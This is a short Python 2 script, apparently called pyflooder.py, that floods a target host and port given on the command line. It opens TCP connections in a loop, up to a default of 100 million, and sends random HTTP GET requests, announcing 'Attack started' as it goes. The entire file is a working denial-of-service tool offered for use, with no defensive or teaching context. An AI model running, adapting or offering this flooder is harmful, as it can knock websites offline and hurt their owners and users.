import socket,sys,random,time,string,threading

#print sys.argv[1]

try:
    #host = str(sys.argv[1]).replace("https://","").replace("http://","").replace("www","")
    #ip = socket.gethostbyname( host )
    ip = str(sys.argv[1])
    print ip
except:
    print " Error:\nMake sure you entered the correct website"
    sys.exit(0)

print sys.argv
if len(sys.argv)<4:
    port = 80
    ran=100000000

elif len(sys.argv)==4:
    port = int(sys.argv[2])
    ran=int(sys.argv[3])

else:
    print "ERROR\n Usage : pyflooder.py hostname port how_many_attacks"

global n
n=0

def attack():

    ip = socket.gethostbyname( str(sys.argv[1]) )
    global n
    msg=str(string.letters+string.digits+string.punctuation)
    data="".join(random.sample(msg,5))
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        n+=1
        print ip
        ddos.connect((ip, port))
        print "GET /%s HTTP/1.1\r\n\r\n" % data
        ddos.send( "GET /%s HTTP/1.1\r\n\r\n" % data )
        print "\n "+time.ctime().split(" ")[3]+" "+"["+str(n)+"] #-#-# Hold Your Tears #-#-#"

    except socket.error:
        print "\n [ No connection! Server maybe down ] "

    ddos.close()

print "[#] Attack started on",ip,"\n"
nn=0

# NOTICE:
# error: [Errno 24] Too many open files
# https://askubuntu.com/questions/162229/how-do-i-increase-the-open-files-limit-for-a-non-root-user

for i in xrange(ran):
    attack()
    #nn+=1
    #t1 = threading.Thread(target=attack)
    #t1.daemon =True # if thread is exist, it dies
    #t1.start()

    #t2 = threading.Thread(target=attack)
    #t2.daemon =True # if thread is exist, it dies
    #t2.start()

    #if nn==100:
        #nn=0
        #time.sleep(0.01)
